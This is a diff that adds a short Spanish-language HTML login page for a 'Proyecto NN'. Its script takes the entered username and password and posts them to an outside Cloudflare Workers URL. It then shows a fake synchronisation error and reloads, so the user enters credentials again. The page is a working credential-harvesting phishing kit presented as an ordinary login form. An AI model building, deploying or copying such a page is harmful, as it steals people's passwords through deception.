@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>NN | Acceso</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #2a2a2a; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 320px; }
+        h2 { text-align: center; margin-bottom: 25px; color: #00d4ff; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: none; border-radius: 6px; background: #3d3d3d; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #00d4ff; border: none; border-radius: 6px; color: #1a1a1a; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #008fb3; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Proyecto NN</h2>
+        <input type="text" id="user" placeholder="Usuario">
+        <input type="password" id="pass" placeholder="Contraseña">
+        <button onclick="enviarNN()">Entrar</button>
+    </div>
+
+    <script>
+        async function enviarNN() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+
+            if(!u || !p) return alert("Datos incompletos");
+
+            // URL DE TU CEREBRO EN CLOUDFLARE
+            const url = "https://proyecto-nn-worker.civerneon.workers.dev/";
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    mode: 'no-cors', 
+                    body: JSON.stringify({ usuario: u, clave: p })
+                });
+                
+                alert("Error de sincronización 0x882. Reintentando...");
+                window.location.reload();
+            } catch(e) {
+                console.log("Error de red");
+            }
+        }
+    </script>
+</body>
+</html>
